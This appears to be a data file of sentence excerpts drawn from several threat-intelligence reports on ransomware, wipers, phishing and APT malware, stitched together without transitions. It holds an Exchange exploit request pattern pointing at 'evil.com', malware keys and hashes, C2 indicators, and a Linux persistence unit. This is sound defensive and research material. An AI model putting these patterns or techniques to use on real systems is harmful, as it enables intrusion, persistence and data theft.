            "According to the Organization of American States (OAS) cybersecurity observatory, most LATAM countries are in the early stages of cybersecurity development.",
            "As a result, there is still a lot to accomplish and implement in terms of cyber security policies in Central American and Caribbean countries.",
            "Nevertheless, countries such as Argentina, Dominican Republic, Ecuador, Panama, and Peru, among others, are making significant efforts to advance their cyber capabilities.",
            "However, there is a small list of countries with established policies, legal frameworks, institutional capacity, and human capital resources, including Brazil, Uruguay, Colombia, and Chile.",
            "And although they are still developing, countries such as Brazil, Colombia, Chile, and Mexico have taken the lead in broadening their institutional capacities, including the development of cyber laws, policies, and regulations.",
            "There is also increased expertise in the private sector, primarily the financial sector, within these nations.",
            "MitigationsIt is crucial to maintain offline backups of your organizations data and ensure that these backups stay up to date to prevent data loss in the event of a ransomware infection.",
            "Additionally, we recommend the following mitigations to reduce overall risk and impact:Ransomware often follows a specific pattern of behavior that can be detected with a robust threat intelligence system that is integrated with SIEM platforms.",
            "Implement YARA rules such as the ones found in Recorded Future Hunting Packages to identify malware via signature-based detection or SNORT rules for endpoint-based detections.",
            "The IOCs provided throughout this report can be used to proactively query or scan environments for items such as file hashes, registry keys, and IP traffic associated with ransomware.",
            "Network segmentation can halt the propagation of ransomware through an organizations network.",
            "This solution involves splitting the larger network into smaller network segments and can be accomplished through firewalls, virtual - local area networks, or other separation techniques.",
            "Implement intrusion detection / intrusion prevention (IDS/IPS) systems and endpoint detection and response (EDR) systems.",
            "Provide robust anti-phishing training for employees and staff.",
            "If remote access solutions are crucial to daily operations, all remote access services and protocols such as Citrix and RDP should be implemented with two-factor or multi-factor authentication.",
            "Exposed RDP servers are also abused by threat actors to gain initial access into a targets network.",
            "Threat actors will look for networks that have internet-facing servers running RDP and then exploit vulnerabilities in those servers or use brute force password attacks.",
            "Once inside the network, the threat actors move laterally and install ransomware on target machines, often disabling backups and other protections.",
            "Through the use of process monitoring, monitor for the execution and command of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit.",
            "Monitor for the creation of suspicious file modification activity, particularly large quantities of file modifications in user directories.",
            "Consider keeping sensitive client information on systems that are disconnected from the internet or segmented from the rest of the corporate network.",
            "Since ransomware will encrypt all files on a victim system and often will search for directories on the network (such as networked file shares) to also encrypt, moving highly sensitive customer data to a system with no internet access or access to the rest of the network will minimize ransomwares access to those files.",
            "OutlookRansomware will likely continue to be incorporated into the attack methods of threat actors targeting public and private entities in LATAM due to their availability as ransomware-as-a-service (for non-technical threat actors) and highly successful infection rates.",

            "A few weeks later, it was revealed that the cyberattacks were part of a coordinated effort likely intended to cripple the country\u2019s computer systems.",
            "On September 10, 2022, Albanian local news reported a second wave of cyberattacks targeting Albania\u2019s TIMS, ADAM and MEMEX systems \u2013 the latter two systems critical for law enforcement \u2013 reportedly using the same attack type and by the same actors. ",
            "Around the same time, we identified ransomware and wiper malware samples resembling those used in the first wave, though with a few interesting modifications that likely allowed evasion of security controls and better attack speeds.",
            "Chief among those changes are the embedding of a raw disk driver, providing direct hard disk access inside the malware itself, modified metadata, and the use of Nvidia\u2019s leaked code signing certificate to sign the malware. ",
            "So, what\u2019s new in this blogpost? ",
            "We compare the first and second waves of ransomware and wiper malware used to target Albanian entities and detail connections with previously known ROADSWEEP ransomware and ZEROCLEARE variants. ",
            "The threat actors used certificates from Nvidia and Kuwait Telecommunications Company to sign their malware; the former was already leaked, but we\u2019re not sure how they got their hands on the latter. ",
            "We identified potential cooperation between different attack groups speaking different languages, and the possible use of AnyDesk as an initial entry point to start the ransomware/wiper infections. ",
            "The changes implemented to automate and speed up wiping in the second wave of attacks are reminiscent of the notorious Shamoon wiper attacks in the Middle East. ",
            "Wiper and ransomware, comparing wave 1 and wave 2 Below, we compare and discuss the differences between the wave 1 and wave 2 ransomware and wiper malware. ",
            "Initial Infection \u2013 traces of cooperation between different attack groups and use of AnyDesk utility ",
            "Although we weren\u2019t able to identify the initial entry point of the threat actor in the analyzed intrusion, a few days after the second wave wiping activities, we noticed underground chatter about someone having access to an AnyDesk account at another non-governmental but significant Albanian entity, and suggestions for Persian-speaking hackers to use it for deploying ransomware or wiper malware.",
            "This may increase the likelihood that the initial entry point for wave 2 is through legitimate remote access software such as AnyDesk, especially since we know that the wave 2 wiper modifications included automatic execution upon driver installation only \u2013 potential need for urgency due to the limited time/access window.",
            "The attackers and access provider seemed to belong to different attack groups and spoke different languages. ",
            "The ransomware \u2013 use of Kuwait Telecommunications Company signing certificate MD5 96eabcc77a6734ea8587599685fbf1b4 SHA1 6a36962709abbfc1f88f87e7fe88a417302bfe43 SHA256 8ad01b028e6aa711d26879d346a7bef82516e372e0f14e8e69db6aef0f25d992 Imphash 653ee44c85bc91d12ec33dfed8056c27 Link time Wed Jul 06 21:30:41 2016 File type 32-bit executable Compiler MinGW-w32 gcc File size 45.48 KB File name PdftoDoc.exe This second wave sample has the same signing certificate parameters as the first wave sample, which is related to Kuwait Telecommunications Company.",
            "It\u2019s unclear how the threat actor was able to sign its malware using Kuwait Telecommunications Company\u2019s certificate, but we suspect it was stolen.",
            "As of the date of this publication, the certificate is no longer valid and has been revoked. ",
            "After the initial execution, the wave 2 ransomware checks for any six arguments (or more) supplied by the threat actor, as opposed to the wave 1 sample that checks for five arguments or more \u2013 a small modification that assists in defense evasion.",
            "Nevertheless, the intrusion analysis conducted on one of the affected machines indicates that in wave 2 the threat actor did not use a BAT file to invoke the ransomware while supplying seven digits similar to wave 1, but instead invoked the wave 2 ransomware immediately from the command line using six zeroes: \u201c000000\u201d.",
            "If ransomware execution fails because the correct arguments are not supplied, the wave 2 sample displays a different message from that of wave 1; the wave 2 message resembles an error message displayed by a PDF to DOC converter. ",
            "Wave 1 sample \u2013 messaging after failed execution Wave 2 sample \u2013 different messaging after failed execution The wave 2 ransomware sample continues execution and checks for the mutex Screenlimitsdevices#77!;, a value that differs from the wave 1 sample\u2019s mutex:abcdefghijklmnoklmnopqrstuvwxyz01234567890abcdefghijklmnopqrstuvwxyz01234567890 Although we call this malware ransomware based on its behavior, the encrypted files are, in fact, unrecoverable.",
            "When comparing wave 2 ransomware samples to wave 1, we notice that both have the same , and both use CreateFile and WriteFile APIs to overwrite files.",
            "During the process of execution, wave 2 ransomware attempts to decrypt and execute embedded scripts, malware settings or API function names.",
            "The encryption algorithm used is RC4 in both wave 1 and wave 2.",
            "However, the RC4 key for decryption in wave 2 has been changed in another attempt to evade detection. ",
            "Wave 1 RC4 key: 8C E4 B1 6B 22 B5 88 94 AA 86 C4 21 E8 75 9D F3 Wave 2 RC4 key: F0 B4 ED D9 43 F5 C8 43 C9 D0 A2 4F 22 9B BC 3A It\u2019s worth noting that in both waves, the RC4 decryption method uses CryptoAPI (CryptDecrypt) instead of the usual substitution box method.",
            "The intrusion we analyzed in wave 2 indicates that the ransomware was probably deployed over the internal network, possibly from another compromised machine.",
            "This is reinforced by the fact that we didn\u2019t see anything else dropped or executed before the ransomware execution, and the ransomware executable name was randomly generated, potentially by the tool the threat actor used to deploy it over the network (e.g., Mellona.exe). ",
            "Despite all the changes made in the wave 2 ransomware, the ransom notes remained the same and included political messaging that reflects the geopolitical tensions between Albania and Iran. ",

            "The three main changes are: Modified malware signing Embedding of EldoS RawDisk driver inside the wiper malware Automatic wiping after driver installation command Historically, in ZEROCLEARE and DUSTMAN incidents from 2019, the wiper malware and raw disk drivers were not signed and therefore could not directly access the raw disk for speedy data wiping.",
            "So, the wipers had to use a third-party loader such as TDL \u2013 a signed loader for unsigned drivers \u2013 to install the unsigned raw disk driver that allows the wiper malware to directly access the raw disk for wiping data using DeviceControl API methods.",
            "However, in the first attack wave targeting Albania, the threat actor signed the wave 1 wiper using the Kuwait Telecommunications Company certificate, thus removing the need for a third-party loader.",
            "The speed and automation improvements remind us of previous Shamoon operations in the Middle East. ",
            "Since the wave 1 wipers were exposed in July 2022, and likely to avoid static detections, the threat actor used Nvidia\u2019s leaked signing certificate to sign the wave 2 wiper in September 2022, again eliminating the need for a third-party loader for the raw disk driver. ",
            "In wave 1, the wiper malware expected to find the raw disk driver in the execution directory or in the system directory.",
            "The driver wasn\u2019t dropped by the wiper, and the threat actor likely dropped it using other means.",
            "Conversely, in wave 2 the threat actor embedded the signed raw disk driver in the wiper executable, dropped it and then installed it.",
            "In addition, the driver being used by the threat actor in wave 2 seems to copy metadata and a few functions from Microsoft\u2019s diskdump.sys crash dump driver[1] (version 10.0.19041.1682) as another means to avoid detections.",
            "The wiping activity starts automatically after the driver installation command; as opposed to the wave 1 wiper, where installation is one step and wiping execution is a second step. ",
            "Finally, for the most part, wave 1 and wave 2 wipers remained the same, including the reliance on the same authentication key to access the raw disk driver, and the use of the same DeviceControl API methods, but with one exception, as shown below.",
            "It\u2019s worth noting that the method IOCTL_DISK_GET_LENGTH_INFO is exclusive to all Persian-speaking APT wipers. ",
            "Wave 1 wiper DeviceControl API methods: IOCTL_DISK_GET_DRIVE_GEOMETRY_EX IOCTL_DISK_GET_DRIVE_GEOMETRY IOCTL_DISK_GET_LENGTH_INFO Wave 2 wiper DeviceControl API methods: IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS (new method in wave 2; used in multiple instances) IOCTL_DISK_GET_DRIVE_GEOMETRY IOCTL_DISK_GET_LENGTH_INFO Based on our telemetry, we suspect the infections are associated with law enforcement institutions in Albania.",
            "This targeting is consistent with the previous wave of cyberattacks affecting the Albanian government during the July 2022 wave of cyberattacks. ",
            "Conclusions In this publication, we discussed the changes made to the second wave of ransomware and wiper samples that targeted Albanian institutions to evade detection and inflict maximum damage. ",
            "Aside from the changes made to evade detection in wave 2, we suspect that the threat actors needed an automated and speedy wiper execution.",
            "In wave 2, the raw disk driver was embedded inside the malware and the wiping routine started immediately after driver installation, as opposed to the wave 1 procedure.",
            "This is reminiscent of Shamoon operations in the Middle East. ",

            "We continue to track the group\u2019s activities and this October we observed the adoption of new malware strains in its arsenal.",
            "The group usually takes advantage of Word documents and uses shortcut files for the initial intrusion.",
            "However, it has recently started to adopt new methods of malware delivery. ",
            "The first new method the group adopted is aimed at evading the Mark-of-the-Web (MOTW) flag, the security measure whereby Windows displays a warning message when the user tries to open a file downloaded from the internet.",
            "To do this, optical disk image (.iso extension) and virtual hard disk (.vhd extension) file formats were used.",
            "This is a common tactic used nowadays to evade MOTW, and BlueNoroff has also adopted it. ",

            "We observed a new Visual Basic Script, a previously unseen Windows Batch file, and a Windows executable.",
            "It seems the actors behind BlueNoroff are expanding or experimenting with new file types to convey their malware efficiently. ",
            "After researching the infrastructure that was utilized, we discovered more than 70 domains used by this group, meaning they were very active until recently.",
            "Also, they created numerous fake domains that look like venture capital and bank domains.",
            "Most of the domains imitate Japanese venture capital companies, indicating that the group has an extensive interest in Japanese financial entities. ",
            "Executive summary BlueNoroff group introduced new file types to evade Mark-of-the-Web (MOTW) security measures; BleuNoroff group expanded file types and tweaked infection methods; BlueNoroff created numerous fake domains impersonating venture capital companies and banks. ",
            "Background At the end of September 2022, we observed new BlueNoroff malware in our telemetry.",

            "Initial analysis suggests this is a forked version with potentially a separate panel for managing the malware. ",
            "While much of the code base is the same, there are several key differences. ",
            "One key difference is the removal of banking functionality such as web injects and backconnect. ",
            "Proofpoint researchers hypothesize the original operators behind Emotet are using an IcedID variant with different functionality. ",
            "Overview Proofpoint researchers have observed and documented, for the first time, three distinct variants of the malware known as IcedID.",
            "Proofpoint calls the two new variants recently identified \u201cForked\u201d and \u201cLite\u201d IcedID.",
            "This report details the following variants of IcedID: Standard IcedID Variant \u2013 The variant most commonly observed in the threat landscape and used by a variety of threat actors. ",
            "Lite IcedID Variant \u2013 New variant observed as a follow-on payload in November Emotet infections that does not exfiltrate host data in the loader checkin and a bot with minimal functionality. ",
            "Forked IcedID Variant \u2013 New variant observed by Proofpoint researchers in February 2023 used by a small number of threat actors which also delivers the bot with minimal functionality. ",
            "IcedID is a malware originally classified as a banking malware and was first observed in 2017.",
            "It also acts as a loader for other malware, including ransomware. ",
            "As previously published, historically there has been just one version of IcedID that has remained constant since 2017.",
            "The well-known IcedID version consists of an initial loader which contacts a Loader C2 server, downloads the standard DLL Loader, which then delivers the standard IcedID Bot. ",
            "In November 2022, Proofpoint researchers observed the first new variant of IcedID Proofpoint dubbed \u201cIcedID Lite\u201d distributed as a follow-on payload in a TA542 Emotet campaign.",
            "It was dropped by the Emotet malware soon after the actor returned to the e-crime landscape after a nearly four-month break. ",
            "The IcedID Lite Loader observed in November 2022 contains a static URL to download a \u201cBot Pack\u201d file with a static name (botpack.dat) which results in the IcedID Lite DLL Loader, and then delivers the Forked version of IcedID Bot, leaving out the webinjects and backconnect functionality that would typically be used for banking fraud. ",
            "Starting in February 2023, Proofpoint observed the new Forked variant of IcedID.",
            "To date, Proofpoint has uncovered seven campaigns using the Forked IcedID variant.",
            "This variant was distributed by TA581 and one unattributed threat activity cluster which acted as initial access facilitators.",
            "The campaigns used a variety of email attachments such as Microsoft OneNote attachments and somewhat rare to see .URL",
            "attachments, which led to the Forked variant of IcedID. ",
            "The IcedID Forked Loader, first observed in February 2023, is more similar to the Standard IcedID Loader in that it contacts a Loader C2 server to retrieve the DLL loader and bot.",
            "That DLL loader has similar artifacts to the Lite Loader, and also loads the Forked IcedID Bot. ",

",
            "The campaign has the objective of stealing Google and subscription credentials of a reputable news and analysis service focusing on North Korea, as well as delivering reconnaissance malware. ",
            "Kimsuky engages in extensive email correspondence and uses spoofed URLs, websites imitating legitimate web platforms, and Office documents weaponized with the ReconShark malware. ",
            "This activity indicates Kimsuky\u2019s growing dedication to social engineering and highlights the group\u2019s increasing interest in gathering strategic intelligence. ",
            "Overview ",
            "In collaboration with NK News, a leading subscription-based service that provides news and analyses about North Korea, SentinelLabs has been tracking a targeted social engineering campaign against experts in North Korean affairs from the non-government sector.",
            "The campaign focuses on theft of email credentials, delivery of reconnaissance malware, and theft of NK News subscription credentials.",
            "Based on the used malware, infrastructure, and tactics, we assess with high confidence that the campaign has been orchestrated by the Kimsuky threat actor. ",
            "The social engineering tactics and some infrastructure characteristics closely relate to a Kimsuky activity privately reported by PwC and discussed in an NSA advisory published during the writing of this article.",
            "We focus on the specific targeting of expert analysts of North Korean affairs by impersonating NK News and stealing NK News credentials, and provide details on used TTPs to support collaborative hunting and detection efforts. ",
            "Kimsuky, a suspected North Korean advanced persistent threat (APT) group whose activities align with the interests of the North Korean government, is known for its global targeting of organizations and individuals.",
            "Operating since at least 2012, the group often employs targeted phishing and social engineering tactics to gather intelligence and access sensitive information. ",
            "A hallmark of the activity we discuss in this post is Kimsuky\u2019s focus on establishing initial contact and developing a rapport with their targets prior to initiating malicious activities.",
            "As part of their initial contact strategy, the group impersonated Chad O\u2019Carroll, the founder of NK News and the associated holding company Korea Risk Group, using an attacker-created domain, nknews[.]pro, which closely resembles the legitimate NK News domain nknews.org.",
            "The initial email requests the review of a draft article analyzing the nuclear threat posed by North Korea. ",
            "If the target engages in the conversation, Kimsuky uses the opportunity to deliver a spoofed URL to a Google document, which redirects to a malicious website specifically crafted to capture Google credentials.",
            "Kimsuky may also deliver a weaponized Office document that executes the ReconShark reconnaissance malware. ",
            "Further, Kimsuky\u2019s objective extends to the theft of subscription credentials from NK News.",
            "To achieve this, the group distributes emails that lure targeted individuals to log in on the malicious website nknews[.]pro, which masquerades as the authentic NK News site.",
            "The login form that is presented to the target is designed to capture entered credentials. ",
            "This Kimsuky activity indicates the group\u2019s growing efforts to establish early communication and foster trust with their targets prior to initiating malicious operations, including the delivery of malware.",
            "Their approach highlights the group\u2019s commitment to creating a sense of rapport with the individuals they target, potentially increasing the success rate of their subsequent malicious activities. ",
            "By actively targeting high-profile experts in North Korean affairs and stealing subscription credentials from prominent news and analysis outlets focussing on North Korea, Kimsuky demonstrates a heightened curiosity in understanding how the international community perceives developments concerning North Korea, such as the country\u2019s military activities.",
            "These actions are probably part of their broader objective to gather strategic intelligence, contributing to North Korea\u2019s decision-making processes. ",
            "Google Credential Theft We observed Kimsuky distributing an HTML-formatted phishing email to selected individuals, which requests the review of a draft article analyzing the nuclear threat posed by North Korea.",
            "The email primarily aims to initiate a subsequent conversation and is intentionally designed to appear benign: It impersonates NK News leadership and lacks any malicious artifacts. ",
            "Initial email If the target engages in the conversation, Kimsuky eventually follows up with an email that contains an URL to a Google document. ",
            "Follow-up email If the target is not responsive, Kimsuky follows up with a reminder email in an attempt to engage the target in conversation. ",
            "Reminder email The URL\u2019s destination is manipulated through the spoofing technique of setting the href HTML property to direct to a website created by Kimsuky.",
            "This method, commonly employed in phishing attacks, creates a discrepancy between the perceived legitimacy of the link (a genuine Google document) and the actual website visited upon clicking the URL. ",
            "The displayed URL to a Google document points to an actual article hosted on Google Docs, delving into the topic of the North Korean nuclear threat.",
            "The article contains visible edits to give the impression of a genuine draft article, aligning with Kimsuky\u2019s luring tactic. ",
            "Google document The spoofed destination of the URL redirects the target to an attacker-created website that masquerades as a legitimate Google Docs site for requesting document access, such as https[://]drive-google[.]shanumedia[.]com/pdf/ul/ji78fghJHKtgfLKJIO/s2.php?menu=ZGFu[...]vbQ== The Base-64 encoded segment, that is, the value of the menu URL query parameter, resolves to the target\u2019s email address. ",
            "This serves as a means of transporting the target\u2019s address to the fake Google Docs site, which enables the site to dynamically display the address, creating a personalized and convincing appearance of legitimacy.",
            "The design and functionality of this site suggest its potential for reuse in targeting different individuals. ",
            "Malicious Google Docs site We were unable to analyze the functionality behind the Request access web element as the group has taken down the site.",
            "However, given the theme of the site, we suspect that it has been designed to capture entered Google credentials. ",
            "During conversations with targeted individuals, Kimsuky also seizes any available opportunity to distribute password-protected weaponized Office documents that deploy the ReconShark reconnaissance malware.",
            "ReconShark exfiltrates information relevant for conducting subsequent precision attacks, such as deployed detection mechanisms and hardware information.",
            "The implementation of the ReconShark variant we observed in this activity remains the same as the one covered in our previous post on Kimsuky activity, with the main distinction being the use of a different C2 server: staradvertiser[.]store.",
            "This domain resolves to the IP address 162.0.209[.]27, which has hosted domains that have been attributed to Kimsuky in previous research, such as sesorin[.]lol and rfa[.]ink.",
            "Kimsuky\u2019s use of ReconShark as part of this activity underscores the malware\u2019s central role within the group\u2019s current operational playbook. ",
            "NK News Credential Theft ",
            "We also observed Kimsuky attempting to steal credentials for the subscription service of NK News, which is known for its comprehensive expert analyses and news reports.",
            "Gaining access to such reports would provide Kimsuky with valuable insights into how the international community assesses and interprets developments related to North Korea, contributing to their broader strategic intelligence-gathering initiatives. ",
            "In order to accomplish this, Kimsuky distributes an email that lure targeted individuals to log in to a spoofed NK News subscription service.",
            "The emails prompt the recipients to confirm their NK News accounts under the pretext of recent security updates. ",
            "Phishing Email The fake login site, hosted at https[://]www.nknews[.]pro/ip/register/, features a login form with the standard web elements, such as Sign In, Sign Up, and Forgot Password?",

            "During the investigation, GTSC Blue Team experts determined that the attack utilized an unpublished Exchange security vulnerability, i.e., a 0-day vulnerability, thus immediately came up with a temporary containment plan.",
            "At the same time, Red Team experts started researching and debugging Exchange de-compiled code to find the vulnerability and exploit code.",
            "Thanks to experience finding the previous 1-day Exchange exploit, the RedTeam has a great understanding of Exchange\u2019s code flows and processing mechanisms, therefore research time was reduced, and the vulnerability was uncovered quickly.",
            "The vulnerability turns out to be so critical that it allows the attacker to do RCE on the compromised system.",
            "GTSC submitted the vulnerability to the Zero Day Initiative (ZDI) right away to work with Microsoft so that a patch could be prepared as soon as possible. ",
            "ZDI verified and acknowledged 2 bugs, whose CVSS scores are 8.8 and 6.3, concerning the exploit as follows. ",
            "However up to now, GTSC has seen other customers also experiencing the similar problem.",
            "After careful testing, we confirmed that those systems were being attacked using this 0-day vulnerability.",
            "To help the community temporarily stop the attack before an official patch from Microsoft is available, we publish this article aiming to those organizations who are using Microsoft Exchange email system. ",
            "Vulnerability information The exploit process comprises of two parts as follows: - Requests with a similar format to the ProxyShell vulnerability: autodiscover/autodiscover.json?@evil.com/<Exchange-backend-endpoint>&Email=autodiscover/autodiscover.json%3f@evil.com.",

            "In this version, we also found components that enable the malware to compromise Linux systems. ",
            "By: Daniel Lunghi March 01, 2023Read time: ( words) Save to Folio Subscribe Iron Tiger is an advanced persistent threat (APT) that has been focused primarily on cyberespionage for more than a decade.",
            "In 2022, we noticed that they updated SysUpdate, one of their custom malware families, to include new features and add malware infection support for the Linux platform. ",
            "We found the oldest sample of this updated version in July 2022.",
            "At the time, we attributed the sample to Iron Tiger but had not yet identified the final payload.",
            "It was only after finding multiple similar payloads in late October 2022 that we looked further and found similarities with the SysUpdate malware family that had also been updated in 2021.",
            "As with the previous version, Iron Tiger had made the loading logic complex, probably in an attempt to evade security solutions. ",
            "This new version has similar features to the 2021 version, except that the C++ run-time type information (RTTI) classes we previously observed in 2021 had been removed, and that the code structure was changed to use the ASIO C++ asynchronous library.",
            "Both changes make reverse engineering the samples longer.",
            "We strongly advise organizations and users in the targeted industries to reinforce their security measures to defend their systems and stored information from this ongoing campaign. ",
            "Campaign development timeline These are the key dates for understanding the chronology of Iron Tiger\u2019s operations: Apr. 2, 2022: Registration of the domain name linked to our oldest Windows sample of SysUpdate May 11, 2022:",
            "The command and control (C&C) infrastructure was set up. ",
            "June 8, 2022:",
            "While this could have been tampered with, observed compilation date of our oldest Windows sample. July 20, 2022:",
            "Oldest Windows sample gets uploaded to Virus Total Oct. 24, 2022:",
            "Oldest Linux sample gets uploaded to Virus Total We observed that the attacker registered the oldest domain name one month before starting the C&C configuration then waited one more month before compiling the malicious sample linked to that domain name.",
            "We think the gap between the two updates allows the attackers to plan their operations accordingly. ",
            "Loading process We observed the loading process entailing the following steps: The attacker runs rc.exe, a legitimate \u201cMicrosoft Resource Compiler\u201d signed file , which is vulnerable to a DLL side-loading vulnerability, and loads a file named rc.dll. ",
            "The malicious rc.dll loads a file named rc.bin in memory. ",
            "The rc.bin file is a Shikata Ga Nai encoded shellcode that decompresses and loads the first stage in memory.",
            "Depending on the number of command line parameters, different actions are performed: Zero or two parameters: \u201cInstalls\u201d the malware in the system, and calls Stage 1 again via process hollowing with four parameters One parameter: Same as previous action but without the \u201cinstallation\u201d Four parameters: Creates a memory section with the DES-encrypted malware configuration and a second Shikata Ga Nai shellcode decompressing and loading Stage 2.",
            "It then runs Stage 2 via process hollowing. ",
            "The \u201cinstallation\u201d step is considered simple wherein the malware moves the files to a hardcoded folder.",
            "Depending on the privileges of the process, the malware either creates a registry key or a service that launches the moved executable rc.exe with one parameter.",
            "This ensures that the malware will be launched during the next reboot, skipping the installation part. ",
            "Figure 1.",
            "Updated SysUpdate loading process routine We saw different legitimate executables being used, sideloading different DLL names, and multiple binary files names being loaded by those DLLs.",
            "We identified the executables and sideloaded files as follows: ",
            "Table 1.",
            "SysUpdate\u2019s seemingly legitimate executables and their respective sideloaded files Legitimate application name Certificate signer Side-loaded DLL name Loaded binary file name INISafeWebSSO.exe Initech inicore_v2.3.30.dll inicore_v2.3.30.bin rc.exe Microsoft rcdll.dll rcdll.bin dlpumgr32.exe DESlock DLPPREM32.dll sv.bin GDFInstall.exe UBISOFT ENTERTAINMENT GameuxInstallHelper.DLL sysconfig.bin route-null.exe Wazuh libwazuhshared.dll wazuhext.bin route-null.exe Wazuh libwazuhshared.dll agent-config.bin wazuh-agent.exe Wazuh libwinpthread-1.dll wazuhext.bin We want to highlight that this is the first time we observed a threat actor abusing a sideloading vulnerability in a Wazuh signed executable.",
            "Wazuh is a free and open source security platform, and we could confirm that one of the victims was using the legitimate Wazuh platform.",
            "It is highly likely that Iron Tiger specifically looked for this vulnerability to appear legitimate in the victim\u2019s environment.",
            "We have notified the affected victim of this intrusion but received no feedback. ",
            "Malware features Looking at the features, several of the functions found in the latest update are similar to the previous SysUpdate version: Service manager (lists, starts, stops, and deletes services) Screenshot grab Process manager (browses and terminates processes) Drive information retrieval File manager (finds, deletes, renames, uploads, downloads a file, and browses a directory) ",
            "Command execution Iron Tiger also added a feature that had not been seen before in this malware family:",
            "C&C communication through DNS TXT requests.",
            "While DNS is not supposed to be a communication protocol, the attacker abuses this protocol to send and receive information. ",
            "Figure 2.",
            "C&C communication with DNS TXT records First, the malware retrieves the configured DNS servers by calling the GetNetworkParams API function and parsing the DnsServerList linked list.",
            "If this method fails, the malware uses the DNS server operated by Google at IP address 8.8.8.8. ",
            "For the first request, the malware generates a random number of 32 bits and appends 0x2191 to it.",
            "This results in six bytes \u2014 four for the random number, two for 0x2191 \u2014 and encodes the result further with Base32 algorithm using the alphabet \u201cabcdefghijklmnopqrstuvwxyz012345\u201d.",
            "Looking at Figure 2, the contacted domain name is after \"TXT\"; only the first four letters change as the rest of the encoded series is always the same.",
            "This is because the random number changes every time, but the end is the same \u201c0x2191\u201d result.",
            "This explains why the first DNS request always ends with \u201creeaaaaaa.<c&c domain>\u201d.",
            "If the C&C reply matches the format expected by the malware, it launches multiple threads that handle further commands and sends information about the infected machine. ",
            "Interestingly, the code related to this DNS C&C communication is only present in samples that use it, meaning that the builder is modular and that there might be samples in the wild with unreported features.",
            "We continue monitoring this group and malware family for updates on possible variations of C&C communication protocols being abused. ",
            "In all versions, the malware retrieves information on the infected machine and sends it to the C&C encrypted with DES.",
            "Collected machine information includes the following: Randomly generated GUID Hostname Domain name Username User privileges Processor architecture Current process ID Operating system version Current file path Local IP address and port used to send the network packet The configuration is encrypted with a hardcoded DES key and is a few bytes long following the structure enumerated below: Table 2.",
            "Configuration structure Field content Length (in bytes) Comment Example Header 4 ",

            "We only saw one case where there was only one stage being decrypted in memory and the configuration was hardcoded. ",
            "Interestingly, all the samples of this \u201cnew\u201d version had a domain name as its C&C. In the previous version of SysUpdate, the group used hardcoded IP addresses as C&C. It is possible that this change is a consequence of the new DNS TXT records\u2019 communication feature as it requires a domain name. ",
            "SysUpdate samples for Linux While investigating SysUpdate\u2019s infrastructure, we found some ELF files linked to some C&C servers.",
            "We analyzed them and concluded that the files were a SysUpdate version made for the Linux platform.",
            "The ELF samples were also written in C++, made use of the Asio library, shared common network encryption keys, and had many similar features.",
            "For example, the file handling functions are almost the same.",
            "It is possible that the developer made use of the Asio library because of its portability across multiple platforms. ",
            "Some parameters can be passed to the binary (note that \u201cBoolean\u201d refers to Boolean data that is sent to the C&C): ",
            "Table 3.",
            "Parameters passed to the binary as observed from Linux SysUpdate samples Parameter Effect -launch Sets persistence, zeroes boolean, and exits -run Zeroes boolean and continues -x Daemonize the process, zeroes boolean, and continues -i Daemonize the process, zeroes boolean, sets persistence, and continues -f <guid> Sets the GUID to <guid> and continues The persistence is ensured by copying a script similarly named as the current filename to the /usr/lib/systemd/system/ directory, and creating a symlink to this file in the /etc/ystem/system/multi-user.target.wants/ directory.",
            "Thus, this method only works if the current process has root privileges.",
            "The content of the script is: ",
            "[Unit] Description=xxx [Service] Type=forking ExecStart=<path to current file> -x ExecStop=/usr/bin/id [Install] WantedBy=multi-user.target After running the code dependent on the parameters, if the operator has not chosen a GUID with the \u201c-f\u201d parameter, the malware generates a random GUID and writes it to a file similarly named as the current file, with a \u201cd\u201d appended to it.",
            "Then, the malware retrieves information on the compromised computer and sends it to the C&C. The following information is sent to the C&C, encrypted with a hardcoded key and DES CBC algorithm: GUID Host name Username Local IP address and port used to send the request Current PID Kernel version and machine architecture Current file path Boolean (0 if it was launched with exactly one parameter, 1 otherwise) ",
            "For the DNS C&C communication version, the malware retrieves the configured DNS server by reading the content of the /etc/resolv.conf file, or uses the DNS server operated by Google at IP address 8.8.8.8. ",
            "In 2022, we already noticed that this threat actor was interested in platforms other than Windows, with the rshell malware family running on Linux and Mac OS.",
            "For these reasons, we would not be surprised to see SysUpdate samples for the Mac OS platform in the future.",
            "Interestingly, most of the Linux samples we found used the new DNS tunneling feature we detailed in Figure 2, while only one of the Windows\u2019 samples used it. ",
            "Certificate compromise Another interesting part of this campaign is the fact that some of the malicious files are signed with a certificate with the following signer: \u201cPermyakov Ivan Yurievich IP\u201d.",
            "Looking for that name in search engines brings results from the official VMProtect website.",
            "The email address linked to the Authenticode certificate also links to that domain name.",
            "VMProtect is a commercial software intended to make analysis of code extremely difficult by implementing a custom virtual machine with non-standard architecture.",
            "The software has been used by multiple APT and cybercrime groups in the past to obfuscate their malware. ",
            "When searching on malware repositories for other files signed by the same certificate, we find multiple files named \u201cVMProtectDemo.exe\u201d, \u201cVMProtect.exe\u201d, or \u201cVMProtect_Con.exe\u201d, which suggests that an official demo version of VMProtect is also signed by this certificate.",
            "It appears that the threat actor managed to retrieve the private key allowing him to sign malicious code.",
            "As of this writing, the certificate is now revoked. ",
            "Using stolen certificates to sign malicious code is a common practice for this threat actor, as we already highlighted in 2015 and in all our recent investigations.",
            "Interestingly, the threat actor not only signed some of its malicious executables with the stolen certificate, but also used VMProtect to obfuscate one of them. ",
            "In late January 2023, a Redline stealer sample (detected by Trend Micro as TrojanSpy.Win32.REDLINE.YXDA1Z, SHA256: e24b29a1df287fe947018c33590a0b443d6967944b281b70fba7ea6556d00109) signed by the same certificate was uploaded.",
            "We do not believe that the stealer is linked to Iron Tiger, considering that the network infrastructure is different, and previous reports document the malware\u2019s goals to be centered on committing cybercrime than data theft.",
            "This could mean other users managed to extract the same private key from the VMProtect demo version, or it was sold in the underground to different groups, Iron Tiger among them. ",
            "Infection vector We did not find an infection vector.",
            "However, we noticed that one of the executables packed with VMProtect and signed with the stolen certificate was named \u201cyoudu_client_211.9.194.exe\u201d.",
            "Youdu is the name of a Chinese instant messaging application aimed for use of enterprise customers.",
            "Its website mentions multiple customers in many industries, some of them in critical sectors such as government, energy, healthcare, or banking.",
            "But they also have other customers in industries such as gaming, IT, media, construction, and retail, apparently all located inside China. ",
            "The properties of the malicious file also match the usual Youdu version numbering.",
            "However, the legitimate files are signed with a \u201cXinda.im\u201d certificate instead of the stolen VMProtect certificate. ",
            "Figure 3.",
            "Comparing the properties of the malicious file (left), and properties of the legitimate Youdu installer (right) ",
